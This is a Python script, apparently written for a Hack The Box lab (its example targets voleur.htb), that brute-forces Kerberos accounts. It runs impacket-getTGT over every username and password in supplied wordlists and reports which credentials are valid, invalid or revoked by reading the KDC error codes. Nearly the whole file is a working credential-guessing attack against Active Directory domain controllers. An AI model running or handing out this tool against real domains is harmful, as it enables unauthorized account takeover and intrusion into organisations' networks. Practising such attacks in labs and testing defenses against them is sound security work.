#!/usr/bin/env python3

import subprocess
import argparse

# ANSI colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

def run_getTGT(domain, user, password, dc_ip):
    cmd = [
        "impacket-getTGT",
        f"{domain}/{user}:{password}",
        "-dc-ip", dc_ip
    ]

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10, text=True)
        output = result.stdout

        if "Saving ticket in" in output:
            print(f"{GREEN}[+] VALID: {user}:{password}{RESET}")
            return "valid"

        elif "KDC_ERR_PREAUTH_FAILED" in output or "KDC_ERR_C_PRINCIPAL_UNKNOWN" in output:
            print(f"{RED}[-] Invalid: {user}:{password}{RESET}")
            return "invalid"

        elif "KDC_ERR_CLIENT_REVOKED" in output:
            print(f"{YELLOW}[!] Revoked: {user}:{password}{RESET}")
            return "revoked"

        else:
            print(f"{CYAN}[?] Unknown result for {user}:{password}\n{output}{RESET}")
            return "unknown"

    except subprocess.TimeoutExpired:
        print(f"{YELLOW}[!] Timeout for {user}:{password}{RESET}")
        return "timeout"
    except Exception as e:
        print(f"{YELLOW}[!] Error running getTGT for {user}:{password}: {e}{RESET}")
        return "error"

def main():
    parser = argparse.ArgumentParser(
        description="Kerberos TGT brute-force using Impacket's getTGT.py",
        epilog="Example: python3 brute.py -d voleur.htb --dc-ip 10.10.11.76 -u users.txt -p passwords.txt"
    )

    parser.add_argument(
        "-d", "--domain",
        required=True,
        help="Kerberos domain (e.g. voleur.htb)"
    )
    parser.add_argument(
        "--dc-ip",
        required=True,
        help="Domain Controller IP address (KDC)"
    )
    parser.add_argument(
        "-u", "--users",
        required=True,
        help="Path to file containing usernames (one per line)"
    )
    parser.add_argument(
        "-p", "--password",
        required=True,
        help="Path to file containing passwords (one per line)"
    )

    args = parser.parse_args()

    try:
        with open(args.users) as f:
            users = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{RED}[!] Failed to read user list: {e}{RESET}")
        return

    try:
        with open(args.password) as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{RED}[!] Failed to read password list: {e}{RESET}")
        return

    for user in users:
        for password in passwords:
            result = run_getTGT(args.domain, user, password, args.dc_ip)
            if result == "valid":
                break  # Stop at first valid password for this user

if __name__ == "__main__":
    main()
